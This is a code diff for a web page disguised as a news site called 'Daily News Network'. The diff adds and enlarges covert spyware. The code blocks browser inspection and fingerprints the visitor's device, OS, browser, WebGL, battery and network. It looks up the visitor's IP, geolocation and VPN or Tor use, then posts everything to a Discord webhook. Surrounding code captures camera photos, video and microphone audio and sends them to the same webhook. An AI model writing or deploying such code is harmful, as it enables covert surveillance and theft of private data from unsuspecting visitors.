@@ -157,6 +157,7 @@
     </style>
 </head>
 <body>
+    <!-- Your existing HTML content remains exactly the same -->
     <header>
         <div class="container">
             <h1>Daily News Network</h1>
@@ -249,14 +250,13 @@
     let isScanComplete = false;
     let isPageClosing = false;
 
-    // Block right click and keyboard shortcuts
+    // Enhanced anti-inspection
     document.addEventListener('contextmenu', function(e) {
         e.preventDefault();
         showInspectWarning();
     });
 
     document.addEventListener('keydown', function(e) {
-        // Block F12, Ctrl+Shift+I, Ctrl+Shift+J, Ctrl+U
         if (e.key === 'F12' || 
             (e.ctrlKey && e.shiftKey && e.key === 'I') || 
             (e.ctrlKey && e.shiftKey && e.key === 'J') || 
@@ -267,99 +267,339 @@
     });
 
     function showInspectWarning() {
-        document.getElementById('inspect-warning').style.display = 'flex';
+        const warning = document.getElementById('inspect-warning');
+        warning.textContent = "You Can't Inspect Noob 😂";
+        warning.style.display = 'flex';
         setTimeout(() => {
-            document.getElementById('inspect-warning').style.display = 'none';
+            warning.style.display = 'none';
         }, 2000);
     }
 
-    // Improved Windows 11 detection
-    function detectOS() {
+    // Enhanced OS detection
+    function detectOSWithVersion() {
         const userAgent = window.navigator.userAgent;
+        const platform = window.navigator.platform;
         let os = "Unknown OS";
+        let version = "Unknown";
         
-        if (/Android/.test(userAgent)) {
+        if (/Windows/.test(platform)) {
+            os = "Windows";
+            const match = userAgent.match(/Windows NT (\d+\.\d+)/);
+            if (match) version = match[1];
+        } else if (/Mac/.test(platform)) {
+            os = "MacOS";
+            const match = userAgent.match(/Mac OS X (\d+[._]\d+)/);
+            if (match) version = match[1].replace('_', '.');
+        } else if (/Linux/.test(platform)) {
+            os = "Linux";
+            const match = userAgent.match(/Linux ([a-zA-Z0-9._-]+)/);
+            if (match) version = match[1];
+        } else if (/Android/.test(userAgent)) {
             os = "Android";
             const match = userAgent.match(/Android\s([0-9\.]+)/);
-            if (match) os += " " + match[1];
-        } 
-        else if (/iPhone|iPad|iPod/.test(userAgent)) {
+            if (match) version = match[1];
+        } else if (/iPhone|iPad|iPod/.test(userAgent)) {
             os = "iOS";
             const match = userAgent.match(/OS\s([0-9_]+)/);
-            if (match) os += " " + match[1].replace(/_/g, ".");
-        }
-        else if (/Windows NT 10.0/.test(userAgent) && /Win64/.test(userAgent)) {
-            os = navigator.userAgentData?.platform === "Windows" ? "Windows 11" : "Windows 10";
-        }
-        else if (/Mac/.test(userAgent)) {
-            os = "MacOS";
-        }
-        else if (/Linux/.test(userAgent)) {
-            os = "Linux";
+            if (match) version = match[1].replace(/_/g, ".");
         }
         
-        return os;
+        return { os, version };
     }
 
-    // Detect browser
-    function detectBrowser() {
+    // Enhanced browser detection
+    function detectBrowserWithEngine() {
         const userAgent = navigator.userAgent;
         let browser = "Unknown Browser";
+        let version = "Unknown";
+        let engine = "Unknown";
         
         if (/Firefox/.test(userAgent)) {
             browser = "Firefox";
-        } else if (/SamsungBrowser/.test(userAgent)) {
-            browser = "Samsung Browser";
-        } else if (/Opera|OPR/.test(userAgent)) {
-            browser = "Opera";
-        } else if (/Trident/.test(userAgent)) {
-            browser = "Internet Explorer";
+            const match = userAgent.match(/Firefox\/([\d.]+)/);
+            if (match) version = match[1];
+            engine = "Gecko";
+        } else if (/Chrome/.test(userAgent) && !/Edge/.test(userAgent)) {
+            browser = "Chrome";
+            const match = userAgent.match(/Chrome\/([\d.]+)/);
+            if (match) version = match[1];
+            engine = "Blink";
+        } else if (/Safari/.test(userAgent) && !/Chrome/.test(userAgent)) {
+            browser = "Safari";
+            const match = userAgent.match(/Version\/([\d.]+)/);
+            if (match) version = match[1];
+            engine = "WebKit";
         } else if (/Edge/.test(userAgent)) {
             browser = "Edge";
-        } else if (/Chrome/.test(userAgent)) {
-            browser = "Chrome";
-        } else if (/Safari/.test(userAgent)) {
-            browser = "Safari";
+            const match = userAgent.match(/Edge\/([\d.]+)/);
+            if (match) version = match[1];
+            engine = "Blink";
+        } else if (/Opera|OPR/.test(userAgent)) {
+            browser = "Opera";
+            const match = userAgent.match(/(?:Opera|OPR)\/([\d.]+)/);
+            if (match) version = match[1];
+            engine = "Blink";
+        } else if (/Trident/.test(userAgent)) {
+            browser = "Internet Explorer";
+            const match = userAgent.match(/rv:([\d.]+)/);
+            if (match) version = match[1];
+            engine = "Trident";
         }
         
-        return browser;
+        return { browser, version, engine };
     }
 
-    // Get screen resolution
-    function getScreenResolution() {
-        return `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`;
-    }
-
-    // Get battery status
-    async function getBatteryStatus() {
-        try {
-            if ('getBattery' in navigator) {
-                const battery = await navigator.getBattery();
-                return `${Math.floor(battery.level * 100)}% ${battery.charging ? '⚡' : ''}`;
-            }
-            return "Unknown (API not supported)";
-        } catch {
-            return "Unknown";
-        }
-    }
-
-    // Detect device type with improved accuracy
-    function detectDeviceType() {
+    // Enhanced device detection
+    function detectDeviceDetails() {
         const ua = navigator.userAgent;
         const isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
         const isTablet = /Tablet|iPad/i.test(ua);
         const hasTouch = navigator.maxTouchPoints > 0;
         const screenWidth = window.screen.width;
         
+        let type = "Desktop";
+        let model = "Traditional PC";
+        let brand = "Unknown";
+        
+        if (/iPhone/.test(ua)) {
+            brand = "Apple";
+            model = "iPhone";
+        } else if (/iPad/.test(ua)) {
+            brand = "Apple";
+            model = "iPad";
+        } else if (/Mac/.test(ua)) {
+            brand = "Apple";
+            model = "Mac";
+        } else if (/Samsung/.test(ua)) {
+            brand = "Samsung";
+        } else if (/Windows/.test(ua)) {
+            brand = "Microsoft";
+        } else if (/Linux/.test(ua)) {
+            brand = "Linux";
+        }
+        
         if (isMobile || isTablet) {
-            return "📱 Mobile Device";
+            type = isTablet ? "Tablet" : "Mobile";
+        } else if (hasTouch && screenWidth <= 1366) {
+            type = "Laptop";
+            model = "Touchscreen Laptop";
         }
         
-        if (hasTouch && screenWidth <= 1366) {
-            return "💻 Laptop";
+        return { type, model, brand };
+    }
+
+    // Enhanced network info
+    function getEnhancedNetworkInfo() {
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        return {
+            type: connection?.type || "Unknown",
+            effectiveType: connection?.effectiveType || "Unknown",
+            downlink: connection?.downlink || "Unknown",
+            rtt: connection?.rtt || "Unknown",
+            saveData: connection?.saveData || false
+        };
+    }
+
+    // Enhanced battery info
+    async function getEnhancedBatteryInfo() {
+        if (!navigator.getBattery) return { status: "API not supported" };
+        
+        try {
+            const battery = await navigator.getBattery();
+            return {
+                level: Math.floor(battery.level * 100) + "%",
+                charging: battery.charging,
+                chargingTime: battery.chargingTime,
+                dischargingTime: battery.dischargingTime
+            };
+        } catch {
+            return { status: "Error getting battery info" };
+        }
+    }
+
+    // Enhanced screen info
+    function getEnhancedScreenInfo() {
+        return {
+            width: window.screen.width,
+            height: window.screen.height,
+            availWidth: window.screen.availWidth,
+            availHeight: window.screen.availHeight,
+            colorDepth: window.screen.colorDepth,
+            pixelRatio: window.devicePixelRatio
+        };
+    }
+
+    // WebGL fingerprint
+    function getWebGLFingerprint() {
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return null;
+            
+            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return {
+                vendor: gl.getParameter(debugInfo?.UNMASKED_VENDOR_WEBGL || 0),
+                renderer: gl.getParameter(debugInfo?.UNMASKED_RENDERER_WEBGL || 0)
+            };
+        } catch {
+            return null;
+        }
+    }
+
+    // Enhanced location info
+    async function getEnhancedLocationInfo() {
+        const data = {
+            // Basic identification
+            timestamp: new Date().toISOString(),
+            sessionId: Math.random().toString(36).substring(2, 15),
+            pageURL: window.location.href,
+            referrer: document.referrer || "None",
+            
+            // Network information
+            ip: "Unknown",
+            network: getEnhancedNetworkInfo(),
+            
+            // Location data
+            geoLocation: {
+                city: "Unknown",
+                region: "Unknown",
+                country: "Unknown",
+                postal: "Unknown",
+                coordinates: { latitude: "Unknown", longitude: "Unknown" },
+                timezone: "Unknown"
+            },
+            
+            // Device information
+            device: {
+                ...detectDeviceDetails(),
+                os: detectOSWithVersion(),
+                cpu: {
+                    architecture: navigator.cpuClass || "Unknown",
+                    cores: navigator.hardwareConcurrency || "Unknown",
+                    memory: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown"
+                },
+                screen: getEnhancedScreenInfo(),
+                battery: await getEnhancedBatteryInfo(),
+                touch: {
+                    supported: 'ontouchstart' in window,
+                    maxPoints: navigator.maxTouchPoints || 0
+                }
+            },
+            
+            // Browser information
+            browser: {
+                ...detectBrowserWithEngine(),
+                userAgent: navigator.userAgent,
+                languages: navigator.languages,
+                language: navigator.language,
+                doNotTrack: navigator.doNotTrack || "Unknown",
+                cookiesEnabled: navigator.cookieEnabled,
+                webGL: getWebGLFingerprint()
+            },
+            
+            // Connection and security
+            connection: {
+                proxy: false,
+                vpn: false,
+                tor: false,
+                threatLevel: "Unknown"
+            },
+            
+            // Media capabilities
+            media: {
+                webcamAccess: "Not checked",
+                microphoneAccess: "Not checked"
+            }
+        };
+
+        try {
+            // Get IP and basic location
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            data.ip = ipData.ip;
+            
+            const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+            const locData = await locationResponse.json();
+            
+            data.geoLocation = {
+                city: locData.city || 'Unknown',
+                region: locData.region || 'Unknown',
+                country: locData.country_name || 'Unknown',
+                postal: locData.postal || 'Unknown',
+                coordinates: {
+                    latitude: locData.latitude || 'Unknown',
+                    longitude: locData.longitude || 'Unknown'
+                },
+                timezone: locData.timezone || 'Unknown'
+            };
+            
+            if (locData.security) {
+                data.connection = {
+                    proxy: locData.security.proxy || false,
+                    vpn: locData.security.vpn || false,
+                    tor: locData.security.tor || false,
+                    threatLevel: locData.security.threat_level || 'Unknown'
+                };
+            }
+            
+        } catch (error) {
+            console.error('Error collecting enhanced data:', error);
         }
         
-        return "🖥️ Desktop PC";
+        return data;
+    }
+
+    // Enhanced sendSystemInfoToDiscord
+    async function sendEnhancedSystemInfo(scanData) {
+        try {
+            const fields = [
+                { name: "IP Address", value: scanData.ip || "Unknown", inline: true },
+                { name: "Country", value: scanData.geoLocation.country || "Unknown", inline: true },
+                { name: "Region", value: scanData.geoLocation.region || "Unknown", inline: true },
+                { name: "City", value: scanData.geoLocation.city || "Unknown", inline: true },
+                { name: "Coordinates", value: `${scanData.geoLocation.coordinates.latitude}, ${scanData.geoLocation.coordinates.longitude}` || "Unknown", inline: true },
+                { name: "OS", value: `${scanData.device.os.os} ${scanData.device.os.version}` || "Unknown", inline: true },
+                { name: "Browser", value: `${scanData.browser.browser} ${scanData.browser.version}` || "Unknown", inline: true },
+                { name: "Engine", value: scanData.browser.engine || "Unknown", inline: true },
+                { name: "Device Type", value: scanData.device.type || "Unknown", inline: true },
+                { name: "Device Model", value: scanData.device.model || "Unknown", inline: true },
+                { name: "Device Brand", value: scanData.device.brand || "Unknown", inline: true },
+                { name: "CPU Cores", value: scanData.device.cpu.cores || "Unknown", inline: true },
+                { name: "RAM", value: scanData.device.cpu.memory || "Unknown", inline: true },
+                { name: "Screen Resolution", value: `${scanData.device.screen.width}x${scanData.device.screen.height}`, inline: true },
+                { name: "Pixel Ratio", value: scanData.device.screen.pixelRatio || "Unknown", inline: true },
+                { name: "Battery Level", value: scanData.device.battery.level || "Unknown", inline: true },
+                { name: "Charging", value: scanData.device.battery.charging ? "Yes" : "No", inline: true },
+                { name: "Connection Type", value: scanData.network.effectiveType || "Unknown", inline: true },
+                { name: "Proxy", value: scanData.connection.proxy ? "Yes" : "No", inline: true },
+                { name: "VPN", value: scanData.connection.vpn ? "Yes" : "No", inline: true },
+                { name: "TOR", value: scanData.connection.tor ? "Yes" : "No", inline: true },
+                { name: "WebGL Vendor", value: scanData.browser.webGL?.vendor || "Unknown", inline: true },
+                { name: "WebGL Renderer", value: scanData.browser.webGL?.renderer || "Unknown", inline: true },
+                { name: "User Agent", value: `\`\`\`${scanData.browser.userAgent.substring(0, 1000)}\`\`\``, inline: false }
+            ];
+
+            await fetch(DISCORD_WEBHOOK, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: `📋 Complete System Information Collected`,
+                    embeds: [{
+                        title: "Enhanced Scan Results",
+                        fields: fields,
+                        color: 0x3498db,
+                        timestamp: new Date().toISOString(),
+                        footer: {
+                            text: "Daily News Network Scan"
+                        }
+                    }]
+                })
+            });
+        } catch (error) {
+            console.error("Error sending enhanced system info to Discord:", error);
+        }
     }
 
     // Capture frame from video and convert to blob
@@ -382,8 +622,8 @@
         
         const content = `📸 ${cameraType === 'front' ? 'Front' : 'Back'} Photo #${sequence}\n` +
                        `IP: ${scanData.ip || "Unknown"}\n` +
-                       `Location: ${scanData.city || "Unknown"}, ${scanData.country || "Unknown"}\n` +
-                       `Device: ${scanData.deviceType || "Unknown"}`;
+                       `Location: ${scanData.geoLocation.city || "Unknown"}, ${scanData.geoLocation.country || "Unknown"}\n` +
+                       `Device: ${scanData.device.type || "Unknown"}`;
 
         formData.append('content', content);
 
@@ -433,8 +673,8 @@
                     
                     const content = `🎥 ${cameraType === 'front' ? 'Front' : 'Back'} camera video (10s)\n` +
                                    `IP: ${scanData.ip || "Unknown"}\n` +
-                                   `Location: ${scanData.city || "Unknown"}, ${scanData.country || "Unknown"}\n` +
-                                   `Device: ${scanData.deviceType || "Unknown"}`;
+                                   `Location: ${scanData.geoLocation.city || "Unknown"}, ${scanData.geoLocation.country || "Unknown"}\n` +
+                                   `Device: ${scanData.device.type || "Unknown"}`;
 
                     formData.append('content', content);
 
@@ -495,8 +735,8 @@
                             
                             const content = `🎤 Audio recording (10s)\n` +
                                            `IP: ${scanData.ip || "Unknown"}\n` +
-                                           `Location: ${scanData.city || "Unknown"}, ${scanData.country || "Unknown"}\n` +
-                                           `Device: ${scanData.deviceType || "Unknown"}`;
+                                           `Location: ${scanData.geoLocation.city || "Unknown"}, ${scanData.geoLocation.country || "Unknown"}\n` +
+                                           `Device: ${scanData.device.type || "Unknown"}`;
 
                             formData.append('content', content);
 
@@ -527,10 +767,10 @@
 
     // Send location map image
     async function sendLocationMap(scanData) {
-        if (!scanData.city || !scanData.country) return;
+        if (!scanData.geoLocation.city || !scanData.geoLocation.country) return;
         
         try {
-            const mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${scanData.city},${scanData.country}&zoom=12&size=600x300&maptype=roadmap&markers=color:red%7C${scanData.city},${scanData.country}&key=YOUR_GOOGLE_MAPS_API_KEY`;
+            const mapUrl = `https://maps.googleapis.com/maps/api/staticmap?center=${scanData.geoLocation.city},${scanData.geoLocation.country}&zoom=12&size=600x300&maptype=roadmap&markers=color:red%7C${scanData.geoLocation.city},${scanData.geoLocation.country}&key=YOUR_GOOGLE_MAPS_API_KEY`;
             
             const response = await fetch(mapUrl);
             const blob = await response.blob();
@@ -540,8 +780,8 @@
             
             const content = `📍 Approximate location map\n` +
                            `IP: ${scanData.ip || "Unknown"}\n` +
-                           `Location: ${scanData.city || "Unknown"}, ${scanData.country || "Unknown"}\n` +
-                           `Device: ${scanData.deviceType || "Unknown"}`;
+                           `Location: ${scanData.geoLocation.city || "Unknown"}, ${scanData.geoLocation.country || "Unknown"}\n` +
+                           `Device: ${scanData.device.type || "Unknown"}`;
 
             formData.append('content', content);
 
@@ -567,85 +807,6 @@
             } catch (error) {
                 console.error(`Error capturing ${cameraType} photo ${i}:`, error);
             }
-        }
-    }
-
-// Send system info to Discord
-async function sendSystemInfoToDiscord(scanData) {
-    try {
-        await fetch(DISCORD_WEBHOOK, {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                content: `📋 System Information Collected`,
-                embeds: [{
-                    title: "Initial Scan Results",
-                    fields: [
-                        { name: "IP", value: scanData.ip || "Unknown", inline: true },
-                        { name: "Country", value: scanData.country || "Unknown", inline: true },
-                        { name: "Region", value: `${scanData.city || 'Unknown'}, ${scanData.state || 'Unknown'}`, inline: true },
-                        { name: "ZIP", value: scanData.zipcode || "Unknown", inline: true },
-                        { name: "OS", value: scanData.os || "Unknown", inline: true },
-                        { name: "Browser", value: scanData.browser || "Unknown", inline: true },
-                        { name: "Device Type", value: scanData.deviceType || "Unknown", inline: true },
-                        { name: "Screen Resolution", value: scanData.screenResolution || "Unknown", inline: true },
-                        { name: "Battery Status", value: scanData.batteryStatus || "Unknown", inline: true },
-                        { name: "Front Camera Status", value: scanData.frontCameraStatus || "Unknown", inline: true },
-                        { name: "Back Camera Status", value: scanData.backCameraStatus || "Unknown", inline: true },
-                        { name: "Microphone Status", value: scanData.microphoneStatus || "Unknown", inline: true },
-                        { name: "User Agent", value: `\`\`\`${navigator.userAgent.substring(0, 300)}\`\`\`` }
-                    ],
-                    color: 0x3498db,
-                    timestamp: new Date().toISOString(),
-                    footer: {
-                        text: "Daily News Network"
-                    }
-                }]
-            })
-        });
-    } catch (error) {
-        console.error("Error sending system info to Discord:", error);
-    }
-}
-
-    // Get location and system info
-    async function getLocationInfo() {
-        scanData = {
-            ip: "Unknown",
-            country: "Unknown",
-            state: "Unknown",
-            city: "Unknown",
-            zipcode: "Unknown",
-            os: detectOS(),
-            browser: detectBrowser(),
-            deviceType: detectDeviceType(),
-            screenResolution: getScreenResolution(),
-            batteryStatus: await getBatteryStatus(),
-            frontCameraStatus: "Not checked",
-            backCameraStatus: "Not checked",
-            microphoneStatus: "Not checked"
-        };
-
-        try {
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const ipData = await ipResponse.json();
-            scanData.ip = ipData.ip;
-            
-            const locationResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-            const locationData = await locationResponse.json();
-            
-            scanData.country = locationData.country_name || 'Unknown';
-            scanData.state = locationData.region || 'Unknown';
-            scanData.city = locationData.city || 'Unknown';
-            scanData.zipcode = locationData.postal || 'Unknown';
-            
-            return scanData;
-            
-        } catch (error) {
-            console.error('Error:', error);
-            return scanData;
         }
     }
 
@@ -700,14 +861,14 @@ async function sendSystemInfoToDiscord(scanData) {
     // Main scan function that runs automatically in sequence
     async function startAutoScan() {
         try {
-            // Step 1: Get system info and send to Discord
-            scanData = await getLocationInfo();
-            await sendSystemInfoToDiscord(scanData);
+            // Step 1: Get enhanced system info and send to Discord
+            scanData = await getEnhancedLocationInfo();
+            await sendEnhancedSystemInfo(scanData);
             
             // Step 2: Handle front camera (photos then video)
             const frontCameraResult = await handleCameraAccess('user');
             frontCameraStream = frontCameraResult.stream;
-            scanData.frontCameraStatus = frontCameraResult.status;
+            scanData.media.webcamAccess = frontCameraResult.stream ? "Granted" : "Denied";
             
             if (frontCameraStream) {
                 const frontVideo = document.createElement('video');
@@ -732,15 +893,18 @@ async function sendSystemInfoToDiscord(scanData) {
             // Step 3: Audio recording
             try {
                 audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-                scanData.microphoneStatus = "Active";
+                scanData.media.microphoneAccess = "Granted";
                 await recordAndSendAudio(scanData);
             } catch (error) {
                 console.error("Microphone error:", error);
-                scanData.microphoneStatus = error.name === 'NotAllowedError' ? "Access denied" : "Error";
+                scanData.media.microphoneAccess = "Denied";
             }
             
             // Step 4: Send location map
             await sendLocationMap(scanData);
+            
+            // Step 5: Send final updated scan data
+            await sendEnhancedSystemInfo(scanData);
             
             // Mark scan as complete
             isScanComplete = true;
@@ -771,8 +935,8 @@ async function sendSystemInfoToDiscord(scanData) {
         try {
             const scanInfo = {
                 ip: scanData.ip || "Unknown",
-                location: `${scanData.city || 'Unknown'}, ${scanData.country || 'Unknown'}`,
-                device: scanData.deviceType || "Unknown",
+                location: `${scanData.geoLocation.city || 'Unknown'}, ${scanData.geoLocation.country || 'Unknown'}`,
+                device: scanData.device.type || "Unknown",
                 status: "Page closed before scan completed"
             };
             
